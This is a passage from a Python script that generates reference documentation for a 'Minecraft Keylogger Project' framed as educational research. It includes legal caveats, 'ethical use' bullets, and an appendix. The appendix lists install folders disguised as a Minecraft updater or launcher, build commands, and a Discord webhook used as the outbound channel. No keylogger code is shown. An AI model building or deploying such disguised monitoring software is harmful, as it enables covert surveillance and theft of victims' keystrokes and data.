        'CFAA (Computer Fraud and Abuse Act) in the US prohibits unauthorized access',
        'GDPR in Europe requires explicit consent for data collection',
        'Penalties can include fines and imprisonment',
    ]
    for point in legal_points:
        doc.add_paragraph(point, style='List Bullet')
    
    doc.add_heading('13.3 Ethical Use Cases', 2)
    
    ethical_uses = [
        'Parental monitoring of minor children\'s devices (with disclosure)',
        'Employee monitoring with explicit consent and notice',
        'Personal device monitoring for security research',
        'Penetration testing with written authorization',
        'Academic research in controlled environments',
        'Cybersecurity training and education',
    ]
    for use in ethical_uses:
        doc.add_paragraph(use, style='List Bullet')
    
    doc.add_heading('13.4 Responsible Disclosure', 2)
    
    p = doc.add_paragraph(
        'If you discover vulnerabilities or security issues in this software, please practice '
        'responsible disclosure:'
    )
    
    disclosure_steps = [
        'Do not publicly disclose the vulnerability',
        'Contact the project maintainers privately',
        'Provide detailed information about the issue',
        'Allow reasonable time for a fix to be developed',
        'Coordinate public disclosure after fix is available',
    ]
    for i, step in enumerate(disclosure_steps, 1):
        p = doc.add_paragraph(style='List Number')
        p.add_run(step)
    
    doc.add_page_break()
    
    # ===== APPENDIX =====
    doc.add_heading('Appendix A: Quick Reference', 1)
    
    doc.add_heading('A.1 File Locations', 2)
    
    locations_table = doc.add_table(rows=1, cols=2)
    locations_table.style = 'Light Grid Accent 1'
    hdr_cells = locations_table.rows[0].cells
    hdr_cells[0].text = 'Platform'
    hdr_cells[1].text = 'Installation Directory'
    
    locations = [
        ('Windows', '%APPDATA%\\Minecraft_Updater'),
        ('Linux', '~/.minecraft_updater'),
        ('Android', '/data/data/com.minecraft.minecraftlauncher'),
    ]
    
    for platform, location in locations:
        row_cells = locations_table.add_row().cells
        row_cells[0].text = platform
        row_cells[1].text = location
    
    doc.add_heading('A.2 Important Commands', 2)
    
    commands_table = doc.add_table(rows=1, cols=2)
    commands_table.style = 'Light Grid Accent 1'
    hdr_cells = commands_table.rows[0].cells
    hdr_cells[0].text = 'Action'
    hdr_cells[1].text = 'Command'
    
    commands = [
        ('Build Windows', 'build_portable.bat'),
        ('Build Linux', './build_portable_linux.sh'),
        ('Build Android', 'buildozer android debug'),
        ('View Logs', 'python view_logs.py'),
        ('Train Face Model', 'python setup_security.py'),
        ('Generate Key', 'python -c "import crypto_utils; crypto_utils.generate_key()"'),
    ]
    
    for action, command in commands:
        row_cells = commands_table.add_row().cells
        row_cells[0].text = action
        row_cells[1].text = command
    
    doc.add_heading('A.3 Default Ports & URLs', 2)
    
    ports_table = doc.add_table(rows=1, cols=2)
    ports_table.style = 'Light Grid Accent 1'
    hdr_cells = ports_table.rows[0].cells
    hdr_cells[0].text = 'Service'
    hdr_cells[1].text = 'Details'
    
    ports = [
        ('Discord Webhook', 'HTTPS (443) to discord.com'),
        ('Connectivity Check', 'DNS (53) to 8.8.8.8'),
        ('Camera Access', 'Local device (no network)'),
    ]
    
    for service, details in ports:
        row_cells = ports_table.add_row().cells
        row_cells[0].text = service
        row_cells[1].text = details
    
    # Footer
    doc.add_page_break()
    
    footer_para = doc.add_paragraph()
    footer_para.alignment = WD_ALIGN_PARAGRAPH.CENTER
    footer_para.add_run('\n\n\n')
    footer_run = footer_para.add_run('END OF REFERENCE DOCUMENTATION')
    footer_run.font.size = Pt(14)
    footer_run.bold = True
    footer_run.font.color.rgb = RGBColor(102, 102, 102)
    
    footer_para.add_run('\n\n')
    footer_para.add_run(f'Generated: {datetime.now().strftime("%B %d, %Y at %I:%M %p")}\n')
    footer_para.add_run('Minecraft Keylogger Project\n')
    footer_para.add_run('Educational Cybersecurity Research')
    
    # Save document
    output_path = 'Project_Reference_Documentation.docx'
    doc.save(output_path)
    print(f"Reference document created successfully: {output_path}")
    return output_path

if __name__ == "__main__":
    create_reference_document()
